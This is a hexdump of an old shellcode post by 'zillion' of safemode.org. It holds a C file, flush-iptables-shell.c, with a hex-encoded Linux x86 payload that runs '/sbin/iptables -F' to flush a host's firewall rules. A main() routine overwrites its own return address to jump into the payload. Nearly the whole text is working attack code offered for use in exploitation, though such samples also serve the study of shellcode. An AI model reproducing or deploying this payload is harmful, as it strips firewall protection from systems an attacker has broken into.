00000000  41 75 74 68 6f 72 3a 20  7a 69 6c 6c 69 6f 6e 0d  |Author: zillion.|
00000010  0a 45 6d 61 69 6c 3a 20  7a 69 6c 6c 69 6f 6e 40  |.Email: zillion@|
00000020  73 61 66 65 6d 6f 64 65  2e 6f 72 67 0d 0a 48 6f  |safemode.org..Ho|
00000030  6d 65 3a 20 68 74 74 70  3a 2f 2f 77 77 77 2e 73  |me: http://www.s|
00000040  61 66 65 6d 6f 64 65 2e  6f 72 67 0d 0a 0d 0a 4c  |afemode.org....L|
00000050  69 6e 75 78 20 78 38 36  20 73 68 65 6c 6c 63 6f  |inux x86 shellco|
00000060  64 65 20 74 68 61 74 20  64 6f 65 73 20 61 6e 20  |de that does an |
00000070  65 78 65 63 76 65 28 29  20 6f 66 20 2f 73 62 69  |execve() of /sbi|
00000080  6e 2f 69 70 74 61 62 6c  65 73 20 2d 46 20 69 6e  |n/iptables -F in|
00000090  20 6f 72 64 65 72 20 74  6f 0d 0a 66 6c 75 73 68  | order to..flush|
000000a0  20 61 63 74 69 76 61 74  65 64 20 66 69 72 65 77  | activated firew|
000000b0  61 6c 6c 20 72 75 6c 65  73 2e 0d 0a 0d 0a 0d 0a  |all rules.......|
000000c0  46 69 6c 65 3a 20 66 6c  75 73 68 2d 69 70 74 61  |File: flush-ipta|
000000d0  62 6c 65 73 2d 73 68 65  6c 6c 2e 63 0d 0a 0d 0a  |bles-shell.c....|
000000e0  2f 2a 0d 0a 20 2a 20 54  68 69 73 20 73 68 65 6c  |/*.. * This shel|
000000f0  6c 63 6f 64 65 20 77 69  6c 6c 20 64 6f 20 2f 73  |lcode will do /s|
00000100  62 69 6e 2f 69 70 74 61  62 6c 65 73 20 2d 46 0d  |bin/iptables -F.|
00000110  0a 20 2a 20 57 72 69 74  74 65 6e 20 62 79 20 7a  |. * Written by z|
00000120  69 6c 6c 69 6f 6e 40 73  61 66 65 6d 6f 64 65 2e  |illion@safemode.|
00000130  6f 72 67 0d 0a 20 2a 0d  0a 20 2a 2f 0d 0a 0d 0a  |org.. *.. */....|
00000140  63 68 61 72 20 73 68 65  6c 6c 63 6f 64 65 5b 5d  |char shellcode[]|
00000150  3d 0d 0a 20 20 20 20 20  20 20 20 22 5c 78 65 62  |=..        "\xeb|
00000160  5c 78 32 31 5c 78 35 65  5c 78 33 31 5c 78 63 30  |\x21\x5e\x31\xc0|
00000170  5c 78 38 38 5c 78 34 36  5c 78 30 65 5c 78 38 38  |\x88\x46\x0e\x88|
00000180  5c 78 34 36 5c 78 31 31  5c 78 38 39 5c 78 37 36  |\x46\x11\x89\x76|
00000190  5c 78 31 32 5c 78 38 64  22 0d 0a 20 20 20 20 20  |\x12\x8d"..     |
000001a0  20 20 20 22 5c 78 35 65  5c 78 30 66 5c 78 38 39  |   "\x5e\x0f\x89|
000001b0  5c 78 35 65 5c 78 31 36  5c 78 38 39 5c 78 34 36  |\x5e\x16\x89\x46|
000001c0  5c 78 31 61 5c 78 62 30  5c 78 30 62 5c 78 38 39  |\x1a\xb0\x0b\x89|
000001d0  5c 78 66 33 5c 78 38 64  5c 78 34 65 5c 78 31 32  |\xf3\x8d\x4e\x12|
000001e0  22 0d 0a 20 20 20 20 20  20 20 20 22 5c 78 38 64  |"..        "\x8d|
000001f0  5c 78 35 36 5c 78 31 61  5c 78 63 64 5c 78 38 30  |\x56\x1a\xcd\x80|
00000200  5c 78 65 38 5c 78 64 61  5c 78 66 66 5c 78 66 66  |\xe8\xda\xff\xff|
00000210  5c 78 66 66 5c 78 32 66  5c 78 37 33 5c 78 36 32  |\xff\x2f\x73\x62|
00000220  5c 78 36 39 5c 78 36 65  22 0d 0a 20 20 20 20 20  |\x69\x6e"..     |
00000230  20 20 20 22 5c 78 32 66  5c 78 36 39 5c 78 37 30  |   "\x2f\x69\x70|
00000240  5c 78 37 34 5c 78 36 31  5c 78 36 32 5c 78 36 63  |\x74\x61\x62\x6c|
00000250  5c 78 36 35 5c 78 37 33  5c 78 33 38 5c 78 32 64  |\x65\x73\x38\x2d|
00000260  5c 78 34 36 5c 78 33 32  5c 78 33 33 5c 78 33 34  |\x46\x32\x33\x34|
00000270  22 0d 0a 20 20 20 20 20  20 20 20 22 5c 78 33 35  |"..        "\x35|
00000280  5c 78 33 36 5c 78 33 37  5c 78 33 38 5c 78 33 39  |\x36\x37\x38\x39|
00000290  5c 78 36 31 5c 78 36 32  5c 78 36 33 5c 78 36 34  |\x61\x62\x63\x64|
000002a0  5c 78 36 35 22 3b 0d 0a  0d 0a 0d 0a 69 6e 74 20  |\x65";......int |
000002b0  6d 61 69 6e 28 29 0d 0a  7b 0d 0a 0d 0a 20 20 69  |main()..{....  i|
000002c0  6e 74 20 2a 72 65 74 3b  0d 0a 20 20 72 65 74 20  |nt *ret;..  ret |
000002d0  3d 20 28 69 6e 74 20 2a  29 26 72 65 74 20 2b 20  |= (int *)&ret + |
000002e0  32 3b 0d 0a 20 20 28 2a  72 65 74 29 20 3d 20 28  |2;..  (*ret) = (|
000002f0  69 6e 74 29 73 68 65 6c  6c 63 6f 64 65 3b 0d 0a  |int)shellcode;..|
00000300  7d 0d 0a 0d 0a 0d 0a 2d  2d                       |}......--|
00000309
